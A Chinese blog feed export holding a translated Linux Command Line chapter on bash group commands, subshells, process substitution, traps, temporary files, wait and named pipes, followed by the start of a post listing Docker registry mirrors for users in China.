<p>这两种形式的区别在于，组命令用大括号围绕其命令，而子shell使用括号。重要的是要注意，由于bash实现组命令的方式，大括号必须与命令之间用空格分隔，并且在关闭大括号之前，最后一个命令必须以分号或换行符结束。</p>
<p>那么，组命令和子shell有什么用呢？虽然它们有一个重要的区别（我们一会儿会讲到），但它们都被用来管理重定向。让我们考虑一个脚本段，对多个命令执行重定向。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> -l &gt; output.txt</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Listing of foo.txt&quot;</span> &gt;&gt; output.txt</span><br><span class="line"><span class="built_in">cat</span> foo.txt &gt;&gt; output.txt</span><br></pre></td></tr></table></figure>

<p>这很简单。三个命令的输出被重定向到一个名为output.txt的文件。使用组命令，我们可以这样编码：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&#123; <span class="built_in">ls</span> -l; <span class="built_in">echo</span> <span class="string">&quot;Listing of foo.txt&quot;</span>; <span class="built_in">cat</span> foo.txt; &#125; &gt; output.txt</span><br></pre></td></tr></table></figure>

<p>使用子shell类似。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(<span class="built_in">ls</span> -l; <span class="built_in">echo</span> <span class="string">&quot;Listing of foo.txt&quot;</span>; <span class="built_in">cat</span> foo.txt) &gt; output.txt</span><br></pre></td></tr></table></figure>

<p>使用这种技巧，我们节省了一些打字，但是在管道中使用组命令或子shell真正闪耀的地方。在构造命令管道时，经常需要将几个命令的结果合并成一个单一的流。组命令和子shell使这变得容易。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&#123; <span class="built_in">ls</span> -l; <span class="built_in">echo</span> <span class="string">&quot;Listing of foo.txt&quot;</span>; <span class="built_in">cat</span> foo.txt; &#125; | lpr</span><br></pre></td></tr></table></figure>

<p>在这里，我们将三个命令的输出组合起来，并通过管道输送到lpr的输入中，以产生打印报告。</p>
<p>在接下来的脚本中，我们将使用组命令，并查看几种与关联数组结合使用的编程技术。这个名为array-2的脚本，在给定目录的名称时，打印目录中文件的列表，以及文件的所有者和组所有者的名称。在列表的末尾，脚本打印每个所有者和组拥有的文件数量。当脚本给定目录&#x2F;usr&#x2F;bin时，我们看到结果（为简洁起见进行了压缩）：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ array-2 /usr/bin</span><br><span class="line">/usr/bin/2to3-2.6 root root</span><br><span class="line">/usr/bin/2to3 root root</span><br><span class="line">/usr/bin/a2p root root</span><br><span class="line">/usr/bin/abrowser root root</span><br><span class="line">/usr/bin/aconnect root root</span><br><span class="line">/usr/bin/acpi_fakekey root root</span><br><span class="line">/usr/bin/acpi_listen root root</span><br><span class="line">/usr/bin/add-apt-repository root root</span><br><span class="line">.</span><br><span class="line">.</span><br><span class="line">.</span><br><span class="line">/usr/bin/zipgrep root root</span><br><span class="line">/usr/bin/zipinfo root root</span><br><span class="line">/usr/bin/zipnote root root</span><br><span class="line">/usr/bin/zip root root</span><br><span class="line">/usr/bin/zipsplit root root</span><br><span class="line">/usr/bin/zjsdecode root root</span><br><span class="line">/usr/bin/zsoelim root root</span><br><span class="line">文件所有者：</span><br><span class="line">daemon : 1个文件</span><br><span class="line">root : 1394</span><br><span class="line"></span><br><span class="line">文件组所有者：</span><br><span class="line">crontab : 1个文件</span><br><span class="line">daemon : 1个文件</span><br><span class="line">lpadmin : 1个文件</span><br><span class="line">mail : 4个文件</span><br><span class="line">mlocate : 1个文件</span><br><span class="line">root : 1380个文件</span><br><span class="line">shadow : 2个文件</span><br><span class="line">ssh : 1个文件</span><br><span class="line"><span class="built_in">tty</span> : 2个文件</span><br><span class="line">utmp : 2个文件</span><br></pre></td></tr></table></figure>

<p>以下是脚本的列表（带有行号）：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># array-2: 使用数组计算文件所有者</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">declare</span> -A files file_group file_owner <span class="built_in">groups</span> owners</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [[ ! -d <span class="string">&quot;<span class="variable">$1</span>&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&quot;用法: array-2 dir&quot;</span> &gt;&amp;2</span><br><span class="line">   <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&quot;<span class="variable">$1</span>&quot;</span>/*; <span class="keyword">do</span></span><br><span class="line">   owner=<span class="string">&quot;<span class="subst">$(stat -c %U <span class="string">&quot;<span class="variable">$i</span>&quot;</span>)</span>&quot;</span></span><br><span class="line">   group=<span class="string">&quot;<span class="subst">$(stat -c %G <span class="string">&quot;<span class="variable">$i</span>&quot;</span>)</span>&quot;</span></span><br><span class="line">   files[<span class="string">&quot;<span class="variable">$i</span>&quot;</span>]=<span class="string">&quot;<span class="variable">$i</span>&quot;</span></span><br><span class="line">   file_owner[<span class="string">&quot;<span class="variable">$i</span>&quot;</span>]=<span class="string">&quot;<span class="variable">$owner</span>&quot;</span></span><br><span class="line">   file_group[<span class="string">&quot;<span class="variable">$i</span>&quot;</span>]=<span class="string">&quot;<span class="variable">$group</span>&quot;</span></span><br><span class="line">   ((++owners[<span class="variable">$owner</span>]))</span><br><span class="line">   ((++groups[<span class="variable">$group</span>]))</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 列出收集的文件</span></span><br><span class="line">&#123; <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&quot;<span class="variable">$&#123;files[@]&#125;</span>&quot;</span>; <span class="keyword">do</span></span><br><span class="line">   <span class="built_in">printf</span> <span class="string">&quot;%-40s %-10s %-10s\n&quot;</span> \</span><br><span class="line">       <span class="string">&quot;<span class="variable">$i</span>&quot;</span> <span class="string">&quot;<span class="variable">$&#123;file_owner[&quot;$i&quot;]&#125;</span>&quot;</span> <span class="string">&quot;<span class="variable">$&#123;file_group[&quot;$i&quot;]&#125;</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span> &#125; | <span class="built_in">sort</span></span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 列出所有者</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;文件所有者：&quot;</span></span><br><span class="line">&#123; <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&quot;<span class="variable">$&#123;!owners[@]&#125;</span>&quot;</span>; <span class="keyword">do</span></span><br><span class="line">   <span class="built_in">printf</span> <span class="string">&quot;%-10s: %5d个文件\n&quot;</span> <span class="string">&quot;<span class="variable">$i</span>&quot;</span> <span class="string">&quot;<span class="variable">$&#123;owners[&quot;$i&quot;]&#125;</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span> &#125; | <span class="built_in">sort</span></span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 列出组</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;文件组所有者：&quot;</span></span><br><span class="line">&#123; <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&quot;<span class="variable">$&#123;!groups[@]&#125;</span>&quot;</span>; <span class="keyword">do</span></span><br><span class="line">   <span class="built_in">printf</span> <span class="string">&quot;%-10s: %5d个文件\n&quot;</span> <span class="string">&quot;<span class="variable">$i</span>&quot;</span> <span class="string">&quot;<span class="variable">$&#123;groups[&quot;$i&quot;]&#125;</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span> &#125; | <span class="built_in">sort</span></span><br></pre></td></tr></table></figure>

<p>让我们看看这个脚本的机制：</p>
<p><strong>第5行：</strong> 关联数组必须使用带有-A选项的declare命令创建。在这个脚本中，我们创建了五个数组如下：</p>
<ul>
<li><p>files包含目录中文件的名称，以文件名为索引</p>
</li>
<li><p>file_group包含每个文件的组所有者，以文件名为索引</p>
</li>
<li><p>file_owner包含每个文件的所有者，以文件名为索引</p>
</li>
<li><p>groups包含归属于索引组的文件数量</p>
</li>
<li><p>owners包含归属于索引所有者的文件数量</p>
</li>
</ul>
<p><strong>第7-10行：</strong> 这些行检查是否传递了一个有效的目录名作为位置参数。如果没有，将显示用法消息，并且脚本以退出状态1退出。</p>
<p><strong>第12-20行：</strong> 这些行遍历目录中的文件。使用stat命令，第13和14行提取文件所有者和组所有者的名称，并将值分别赋给各自的数组（第16和17行），使用文件名作为数组索引。同样，文件名本身被赋给files数组（第15行）。</p>
<p><strong>第18-19行：</strong> 归属于文件所有者和组所有者的总文件数增加1。</p>
<p><strong>第22-27行：</strong> 输出文件列表。这是使用”${array[@]}”参数扩展完成的，它扩展为整个数组元素列表，每个元素被视为一个单独的单词。这允许考虑到文件名可能包含嵌入的空格的可能性。也请注意，整个循环被包含在大括号中，从而形成一个组命令。这允许将循环的整个输出通过管道送入sort命令。这是必要的，因为数组元素的扩展不是排序的。</p>
<p><strong>第29-40行：</strong> 这两个循环类似于文件列表循环，除了它们使用”$ {!array[@]}”扩展，它扩展为数组索引列表而不是数组元素列表。</p>
<h4 id="进程替换"><a href="#进程替换" class="headerlink" title="进程替换"></a>进程替换</h4><p>虽然它们看起来相似，并且都可以用来组合流以进行重定向，但组命令和子shell之间有一个重要的区别。组命令在当前shell中执行其所有命令，而子shell（顾名思义）在当前shell的一个子副本中执行其命令。这意味着环境被复制并赋予一个新的shell实例。当子shell退出时，环境的副本会丢失，因此对子shell环境所做的任何更改（包括变量赋值）也会丢失。因此，在大多数情况下，除非脚本需要一个子shell，否则组命令比子shell更可取。组命令既快速又节省内存。</p>
<p>我们在第28章“读取键盘输入”中看到了子shell环境问题的一个例子，当我们发现在管道中的read命令不如我们直观预期的那样工作。回顾一下，如果我们构造像这样的管道：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;foo&quot;</span> | <span class="built_in">read</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$REPLY</span></span><br></pre></td></tr></table></figure>

<p>REPLY变量的内容总是为空，因为read命令在子shell中执行，而子shell终止时其REPLY的副本被销毁。</p>
<p>因为管道中的命令总是在子shell中执行，所以任何分配变量的命令都会遇到这个问题。幸运的是，shell提供了一种称为<em>进程替换</em>的异域形式的扩展，可以用来解决这个问题。</p>
<p>进程替换以两种方式表达。</p>
<p>对于产生标准输出的进程，它看起来像这样：</p>
<blockquote>
<p>&lt;(<em>list</em>)</p>
</blockquote>
<p>或者，对于需要标准输入的进程，它看起来像这样：</p>
<blockquote>
<p>&gt;(<em>list</em>)</p>
</blockquote>
<p>其中<em>list</em>是命令列表。</p>
<p>为了解决我们的read问题，我们可以像这样使用进程替换：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">read</span> &lt; &lt;(<span class="built_in">echo</span> <span class="string">&quot;foo&quot;</span>)</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$REPLY</span></span><br></pre></td></tr></table></figure>

<p>进程替换允许我们将子shell的输出视为普通文件以进行重定向。实际上，由于它是一种形式的扩展，我们可以检查它的真实值。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> &lt;(<span class="built_in">echo</span> <span class="string">&quot;foo&quot;</span>)</span><br><span class="line">/dev/fd/63</span><br></pre></td></tr></table></figure>

<p>通过使用echo来查看扩展的结果，我们看到子shell的输出是通过名为&#x2F;dev&#x2F;fd&#x2F;63的文件提供的。</p>
<p>进程替换经常与包含read的循环一起使用。这是一个read循环的示例，该循环处理由子shell创建的目录列表的内容：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># pro-sub: 进程替换演示</span></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">read</span> attr links owner group size <span class="built_in">date</span> time filename; <span class="keyword">do</span></span><br><span class="line">  <span class="built_in">cat</span> &lt;&lt;- <span class="string">EOF</span></span><br><span class="line"><span class="string">    文件名: $filename</span></span><br><span class="line"><span class="string">    大小: $size</span></span><br><span class="line"><span class="string">    所有者: $owner</span></span><br><span class="line"><span class="string">    组: $group</span></span><br><span class="line"><span class="string">    修改时间: $date $time</span></span><br><span class="line"><span class="string">    链接: $links</span></span><br><span class="line"><span class="string">    属性: $attr</span></span><br><span class="line"><span class="string">  EOF</span></span><br><span class="line"><span class="keyword">done</span> &lt; &lt;(<span class="built_in">ls</span> -l | <span class="built_in">tail</span> -n +2)</span><br></pre></td></tr></table></figure>

<p>循环为目录列表的每一行执行read。列表本身在脚本的最后一行产生。这一行将进程替换的输出重定向到循环的标准输入。tail命令包含在进程替换管道中，以消除列表的第一行，因为它不是必需的。</p>
<p>执行时，脚本产生如下输出：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ pro-sub | <span class="built_in">head</span> -n 20</span><br><span class="line">文件名: addresses.ldif</span><br><span class="line">大小: 14540</span><br><span class="line">所有者: me</span><br><span class="line">组: me</span><br><span class="line">修改时间: 2009-04-02 11:12</span><br><span class="line">链接: 1</span><br><span class="line">属性: -rw-r--r--</span><br><span class="line">文件名: bin</span><br><span class="line">大小: 4096</span><br><span class="line">所有者: me</span><br><span class="line">组: me</span><br><span class="line">修改时间: 2009-07-10 07:31</span><br><span class="line">链接: 2</span><br><span class="line">属性: drwxr-xr-x</span><br><span class="line">文件名: bookmarks.html</span><br><span class="line">大小: 394213</span><br><span class="line">所有者: me</span><br><span class="line">组: me</span><br></pre></td></tr></table></figure>

<h3 id="陷阱"><a href="#陷阱" class="headerlink" title="陷阱"></a>陷阱</h3><p>在第10章“进程”中，我们看到了程序如何响应信号。我们也可以将这种能力添加到我们的脚本中。虽然到目前为止我们编写的脚本不需要这种能力（因为它们的执行时间非常短，不创建临时文件），但更大更复杂的脚本可能会从有信号处理例程中受益。</p>
<p>当我们设计一个大型、复杂的脚本时，重要的是要考虑如果用户在脚本运行时注销或关闭计算机会发生什么。当这种事件发生时，将向所有受影响的进程发送信号。反过来，代表那些进程的程序可以执行操作以确保程序的适当和有序终止。比如说，例如，我们编写了一个脚本，在其执行过程中创建了一个临时文件。在良好的设计过程中，我们会让脚本在完成工作时删除该文件。如果收到一个信号表明程序将被提前终止，让脚本删除该文件也是明智的。</p>
<p>bash提供了一个称为<em>陷阱</em>的机制，用于此目的。陷阱是用恰当命名的内置命令trap来实现的。trap使用以下语法：</p>
<blockquote>
<p>trap <em>argument</em> <em>signal</em> [<em>signal</em>…]</p>
</blockquote>
<p>其中<em>argument</em>是将被读取并视为命令的字符串，<em>signal</em>是将触发解释命令执行的信号的规范。</p>
<p>这是一个简单的例子：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># trap-demo: 简单的信号处理演示</span></span><br><span class="line"><span class="built_in">trap</span> <span class="string">&quot;echo &#x27;我正在忽略你。&#x27;&quot;</span> SIGINT SIGTERM</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> &#123;1..5&#125;; <span class="keyword">do</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="string">&quot;迭代 <span class="variable">$i</span> 的 5&quot;</span></span><br><span class="line">	<span class="built_in">sleep</span> 5</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<p>当脚本运行时，每次接收到SIGINT或SIGTERM信号时，这个脚本定义的陷阱都会执行一个echo命令。当用户尝试按Ctrl-c停止脚本时，程序的执行看起来像这样：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ trap-demo</span><br><span class="line">迭代 1 的 5</span><br><span class="line">迭代 2 的 5</span><br><span class="line">^C我正在忽略你。</span><br><span class="line">迭代 3 的 5</span><br><span class="line">^C我正在忽略你。</span><br><span class="line">迭代 4 的 5</span><br><span class="line">迭代 5 的 5</span><br></pre></td></tr></table></figure>

<p>正如我们所看到的，每次用户尝试中断程序时，消息就会被打印出来。</p>
<p>构建一个形成有用命令序列的字符串可能会很尴尬，因此通常的做法是指定一个shell函数作为命令。在这个例子中，为要处理的每个信号指定了一个单独的shell函数：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># trap-demo2: 简单的信号处理演示</span></span><br><span class="line"><span class="function"><span class="title">exit_on_signal_SIGINT</span></span> () &#123;</span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;脚本被中断。&quot;</span> 2&gt;&amp;1</span><br><span class="line">  <span class="built_in">exit</span> 0</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="title">exit_on_signal_SIGTERM</span></span> () &#123;</span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;脚本被终止。&quot;</span> 2&gt;&amp;1</span><br><span class="line">  <span class="built_in">exit</span> 0</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">trap</span> exit_on_signal_SIGINT SIGINT</span><br><span class="line"><span class="built_in">trap</span> exit_on_signal_SIGTERM SIGTERM</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> &#123;1..5&#125;; <span class="keyword">do</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;迭代 <span class="variable">$i</span> 的 5&quot;</span></span><br><span class="line">  <span class="built_in">sleep</span> 5</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<p>这个脚本有两个trap命令，每个信号一个。每个陷阱反过来指定一个在接收到特定信号时要执行的shell函数。注意在每个信号处理函数中都包含了一个exit命令。如果没有exit，脚本将在完成函数后继续。</p>
<p>当用户在执行这个脚本时按Ctrl-c时，结果看起来像这样：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ trap-demo2</span><br><span class="line">迭代 1 的 5</span><br><span class="line">迭代 2 的 5</span><br><span class="line">^C脚本被中断。</span><br></pre></td></tr></table></figure>

<p><strong>临时文件</strong></p>
<p>脚本中包含信号处理程序的一个原因是为了移除脚本在执行过程中可能创建的用于保存中间结果的临时文件。为临时文件命名几乎是一种艺术。传统上，类Unix系统上的程序在&#x2F;tmp目录中创建它们的临时文件，这是一个为此类文件设计的共享目录。然而，由于目录是共享的，这就带来了某些安全问题，特别是对于以超级用户权限运行的程序。除了为系统上所有用户暴露的文件设置适当权限这一明显步骤外，为临时文件赋予不可预测的文件名很重要。这可以避免所谓的<em>临时文件竞争攻击</em>。创建一个不可预测（但仍然描述性的）名称的一种方式是这样的：</p>
<blockquote>
<p>tempfile&#x3D;&#x2F;tmp&#x2F;<code>$(basename $</code>0).$$.$RANDOM</p>
</blockquote>
<p>这将创建一个由程序名、其进程ID（PID）和一个随机整数组成的文件名。然而，请注意，$RANDOM shell变量只返回1-32767范围内的一个值，这在计算机术语中不是一个大范围，所以单个变量实例不足以克服一个决心攻击者。</p>
<p>更好的方式是使用mktemp程序（不要与mktemp标准库函数混淆）来命名和创建临时文件。mktemp程序接受一个模板作为参数，用于构建文件名。模板应该包括一系列的“X”字符，这些字符被替换为相应数量的随机字母和数字。”X”字符序列越长，随机字符序列就越长。这是一个例子：</p>
<blockquote>
<p>tempfile&#x3D;$(mktemp &#x2F;tmp&#x2F;foobar.$$.XXXXXXXXXX)</p>
</blockquote>
<p>这创建了一个临时文件，并将其名称分配给变量tempfile。模板中的“X”字符被替换为随机字母和数字，以至于最终文件名（在这个例子中，还包括特殊参数$$的展开值以获得PID）可能是这样的</p>
<blockquote>
<p>:&#x2F;tmp&#x2F;foobar.6593.UOZuvM6654</p>
</blockquote>
<p>对于由普通用户执行的脚本，避免使用&#x2F;tmp目录并在用户的主目录内为临时文件创建一个目录可能是明智的，可以用这样一行代码来实现：</p>
<blockquote>
<p>:[[ -d <code>$HOME/tmp ]] || mkdir $</code>HOME&#x2F;tmp</p>
</blockquote>
<h3 id="异步执行"><a href="#异步执行" class="headerlink" title="异步执行"></a>异步执行</h3><p>有时候，同时执行多个任务是可取的。我们已经看到，所有现代操作系统至少是多任务的，如果不是多用户的话。脚本可以被构建为以多任务方式行为。</p>
<p>通常，这涉及到启动一个脚本，该脚本反过来启动一个或多个子脚本来执行额外的任务，而父脚本继续运行。然而，当一系列脚本以这种方式运行时，保持父子之间的协调可能会有问题。也就是说，如果父或子依赖于另一个，一个脚本必须等待另一个完成其任务后才能完成自己的任务怎么办？</p>
<p>bash有一个内置命令可以帮助管理这样的<em>异步执行</em>。wait命令导致父脚本暂停，直到指定的进程（即，子脚本）完成。</p>
<h4 id="wait"><a href="#wait" class="headerlink" title="wait"></a>wait</h4><p>我们首先演示wait命令。为此，我们需要两个脚本。首先是父脚本。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># async-parent: 异步执行演示（父）</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;父：开始...&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;父：启动子脚本...&quot;</span></span><br><span class="line">async-child &amp;</span><br><span class="line">pid=$!</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;父：子进程（PID</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">= <span class="variable">$pid</span>）已启动。&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;父：继续...&quot;</span></span><br><span class="line"><span class="built_in">sleep</span> 2</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;父：暂停以等待子进程完成...&quot;</span></span><br><span class="line"><span class="built_in">wait</span> <span class="string">&quot;<span class="variable">$pid</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;父：子进程完成。继续...&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;父：父进程完成。退出。&quot;</span></span><br></pre></td></tr></table></figure>

<p>第二个是子脚本。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># async-child: 异步执行演示（子）</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;子：子进程正在运行...&quot;</span></span><br><span class="line"><span class="built_in">sleep</span> 5</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;子：子进程完成。退出。&quot;</span></span><br></pre></td></tr></table></figure>

<p>在这个例子中，我们看到子脚本很简单。真正的操作由父脚本执行。在父脚本中，子脚本被启动并放入后台。通过将pid变量赋值为$! shell参数的值来记录子脚本的进程ID，这个参数总是包含最后一个放入后台的工作的进程ID。</p>
<p>父脚本继续执行，然后用子进程的PID执行wait命令。这导致父脚本暂停，直到子脚本退出，此时父脚本结束。</p>
<p>执行时，父子脚本产生以下输出：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ async-parent</span><br><span class="line">父：开始...</span><br><span class="line">父：启动子脚本...</span><br><span class="line">父：子进程（PID= 6741）已启动。</span><br><span class="line">父：继续...</span><br><span class="line">子：子进程正在运行...</span><br><span class="line">父：暂停以等待子进程完成...</span><br><span class="line">子：子进程完成。退出。</span><br><span class="line">父：子进程完成。继续...</span><br><span class="line">父：父进程完成。退出。</span><br></pre></td></tr></table></figure>

<h3 id="命名管道"><a href="#命名管道" class="headerlink" title="命名管道"></a>命名管道</h3><p>在大多数类Unix系统中，可以创建一种特殊类型的文件，称为<em>命名管道</em>。命名管道用于创建两个进程之间的连接，并可以像其他类型的文件一样使用。它们不是很流行，但了解它们是很好的。</p>
<p>有一种常见的编程架构称为<em>客户端-服务器</em>，它可以使用诸如命名管道之类的通信方法，以及其他类型的<em>进程间通信</em>，如网络连接。</p>
<p>最广泛使用的客户端-服务器系统类型当然是网页浏览器与网页服务器的通信。网页浏览器充当客户端，向服务器发出请求，服务器则用网页响应浏览器。</p>
<p>命名管道表现得像文件，但实际上形成了先入先出（FIFO）缓冲区。就像普通的（未命名的）管道一样，数据从一端进入，从另一端出来。有了命名管道，就可以设置像这样的东西：</p>
<blockquote>
<p><em>process1</em> &gt; <em>named_pipe</em></p>
</blockquote>
<p>和这样的：</p>
<blockquote>
<p><em>process2</em> &lt; <em>named_pipe</em></p>
</blockquote>
<p>它将表现得像这样：</p>
<blockquote>
<p><em>process1</em> | <em>process2</em></p>
</blockquote>
<h4 id="设置命名管道"><a href="#设置命名管道" class="headerlink" title="设置命名管道"></a>设置命名管道</h4><p>首先，我们必须创建一个命名管道。这是使用mkfifo命令完成的。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">mkfifo</span> pipe1</span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">ls</span> -l pipe1</span><br><span class="line">prw-r--r-- 1 me me 0 2009-07-17 06:41 pipe1</span><br></pre></td></tr></table></figure>

<p>这里我们使用mkfifo创建了一个名为pipe1的命名管道。使用ls，我们检查文件，看到属性字段中的第一个字母是“p”，表示它是一个命名管道。</p>
<h4 id="使用命名管道"><a href="#使用命名管道" class="headerlink" title="使用命名管道"></a>使用命名管道</h4><p>为了演示命名管道的工作方式，我们需要两个终端窗口（或者两个虚拟控制台）。在第一个终端，我们输入一个简单的命令，并将其输出重定向到命名管道。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">ls</span> -l &gt; pipe1</span><br></pre></td></tr></table></figure>

<p>按下回车键后，命令似乎会挂起。这是因为另一端还没有东西接收数据。发生这种情况时，称为管道被<em>阻塞</em>。一旦我们将一个进程附加到另一端并开始从管道读取输入，这种情况就会清除。使用第二个终端窗口，我们输入这个命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">cat</span> &lt; pipe1</span><br></pre></td></tr></table></figure>

<p>从第一个终端窗口产生的目录列表出现在第二个终端作为cat命令的输出。第一个终端中的ls命令一旦不再被阻塞就成功完成。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>好了，我们的旅程已经完成。现在唯一剩下的就是练习，练习，再练习。尽管我们在徒步旅行中涵盖了很多地面，我们还只是刚刚触及了命令行的表面。还有成千上万的命令行程序等待被发现和享受。开始在&#x2F;usr&#x2F;bin里挖掘，你就会看到！</p>
<h3 id="进一步阅读"><a href="#进一步阅读" class="headerlink" title="进一步阅读"></a>进一步阅读</h3><ul>
<li><p>bash手册页的“复合命令”部分包含了组命令和子shell表示法的完整描述。</p>
</li>
<li><p>bash手册页的EXPANSION部分包含了一个涵盖进程替换的子节。</p>
</li>
<li><p><em>高级Bash脚本编写指南</em>也讨论了进程替换：</p>
<p><span class="exturl" data-url="aHR0cDovL3RsZHAub3JnL0xEUC9hYnMvaHRtbC9wcm9jZXNzLXN1Yi5odG1s">http://tldp.org/LDP/abs/html/process-sub.html<i class="fa fa-external-link-alt"></i></span></p>
</li>
<li><p><em>Linux Journal</em>有两篇关于命名管道的好文章。第一篇，来自1997年9月：</p>
<p><span class="exturl" data-url="aHR0cDovL3d3dy5saW51eGpvdXJuYWwuY29tL2FydGljbGUvMjE1Ng==">http://www.linuxjournal.com/article/2156<i class="fa fa-external-link-alt"></i></span></p>
</li>
<li><p>第二篇，来自2009年3月：</p>
<p><span class="exturl" data-url="aHR0cDovL3d3dy5saW51eGpvdXJuYWwuY29tL2NvbnRlbnQvdXNpbmctbmFtZWQtcGlwZXMtZmlmb3MtYmFzaA==">http://www.linuxjournal.com/content/using-named-pipes-fifos-bash<i class="fa fa-external-link-alt"></i></span></p>
</li>
</ul>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>TLCL</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker更换为国内镜像</title>
    <url>/2022/02/docker-proxy/</url>
    <content><![CDATA[<h2 id="更换原因"><a href="#更换原因" class="headerlink" title="更换原因"></a>更换原因</h2><p>在国内访问 Docker 官方的镜像，一直以来速度都慢如蜗牛，很多镜像动不动就1G或几百M，官方经常掉线。为了快速访问 Docker 官方镜像都会配置第三方加速器。</p>
<span id="more"></span>

<h2 id="国内的镜像源有"><a href="#国内的镜像源有" class="headerlink" title="国内的镜像源有"></a>国内的镜像源有</h2><figure class="highlight dts"><table><tr><td class="code"><pre><span class="line">Docker官方中国区</span><br><span class="line"><span class="symbol">  https:</span><span class="comment">//registry.docker-cn.com</span></span><br><span class="line">网易</span><br><span class="line"><span class="symbol">  http:</span><span class="comment">//hub0mirror.c.163.com</span></span><br><span class="line">USTC</span><br><span class="line"><span class="symbol">  http:</span><span class="comment">//docker.mirrors.ustc.edu.cn</span></span><br><span class="line">阿里云</span><br><span class="line"><span class="symbol">  http:</span><span class="comment">//&lt;your-id&gt;.mirror.aliyuncs.com</span></span><br></pre></td></tr></table></figure>

<p>现在 Docker 官方针对中国区推出了镜像加速服务。通过 Docker 官方镜像加速，国内用户能够以更快的下载速度和更强的稳定性访问最流行的 Docker 镜像。</p>
<h2 id="如何使用官方镜像"><a href="#如何使用官方镜像" class="headerlink" title="如何使用官方镜像"></a>如何使用官方镜像</h2><p>Docker 中国官方镜像加速可通过 registry.docker-cn.com 访问。目前该镜像库只包含流行的公有镜像，而私有镜像仍需要从美国镜像库中拉取。</p>
<p>可以使用以下命令直接从该镜像加速地址进行拉取。</p>
